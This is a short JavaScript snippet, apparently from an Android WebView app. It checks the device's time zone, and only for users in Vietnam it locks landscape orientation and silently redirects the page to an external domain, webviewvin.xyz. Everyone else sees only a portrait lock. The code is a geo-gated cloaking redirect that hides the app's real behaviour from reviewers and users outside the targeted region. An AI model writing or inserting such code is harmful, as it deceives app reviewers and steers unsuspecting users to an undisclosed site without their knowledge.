const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
    AndroidOrientation.lockLandscape();
  }
  var to = "https://webviewvin.xyz/";
  window.location.href = to;
} else {
  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
    AndroidOrientation.lockPortrait();
  }
}
